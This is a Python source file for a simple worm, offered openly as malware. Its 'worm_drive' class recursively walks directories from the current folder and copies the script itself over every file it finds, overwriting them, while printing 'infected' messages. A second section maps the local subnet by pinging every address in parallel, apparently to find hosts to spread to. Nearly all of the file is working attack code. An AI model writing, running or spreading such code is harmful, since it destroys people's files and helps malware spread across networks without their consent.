import os
import sys
import shutil
import time
import socket
import multiprocessing
import subprocess

directories = []
filename = sys.argv[0]

class worm_drive:
    def __init__(self):
        pass
    def filtering_and_expanding(self, path):
        for sub_dirs in os.listdir(path):
            if not sub_dirs.startswith('.') and not sub_dirs.startswith(str(filename)):
                directories.append(path + '/' + sub_dirs)

    def copies(self, path):
        try:
            destination = path
            shutil.copy(filename, destination)
        except Exception as e:
            print(e)

    def starting(self):
        self.filtering_and_expanding(os.getcwd())


    def initialiting(self):
        for i in directories:
            if os.path.isdir(i):
                available_directories = i
                self.filtering_and_expanding(available_directories)
            if os.path.isfile(i):
                self.copies(i)


    def worm_spreading(self):
        self.initialiting()
        for i in directories:
            try:
                print('[+] Successfully infected file or directory: ' + i)
                time.sleep(1)
            except Exception as e:
                print('[-] file infection failed on ' + i + " reason is " + str(e))
                time.sleep(1)
# This is not my code. 
def pinger(job_q, results_q):
    """
    Do Ping
    :param job_q:
    :param results_q:
    :return:
    """
    DEVNULL = open(os.devnull, 'w')
    while True:

        ip = job_q.get()

        if ip is None:
            break

        try:
            subprocess.check_call(['ping', '-c1', ip],
                                  stdout=DEVNULL)
            results_q.put(ip)
        except:
            pass


def get_my_ip():
    """
    Find my IP address
    :return:
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def map_network(pool_size=255):
    """
    Maps the network
    :param pool_size: amount of parallel ping processes
    :return: list of valid ip addresses
    """

    ip_list = list()

    # get my IP and compose a base like 192.168.1.xxx
    ip_parts = get_my_ip().split('.')
    base_ip = ip_parts[0] + '.' + ip_parts[1] + '.' + ip_parts[2] + '.'

    # prepare the jobs queue
    jobs = multiprocessing.Queue()
    results = multiprocessing.Queue()

    pool = [multiprocessing.Process(target=pinger, args=(jobs, results)) for i in range(pool_size)]
    [p.start() for p in pool], 
    [jobs.put(base_ip + '{0}'.format(i)) for i in range(1,255)] ,
    [jobs.put(None) for p in pool], [p.join() for p in pool]

    # collect he results
    while not results.empty():
        ip = results.get()
        ip_list.append(ip)

    return ip_list
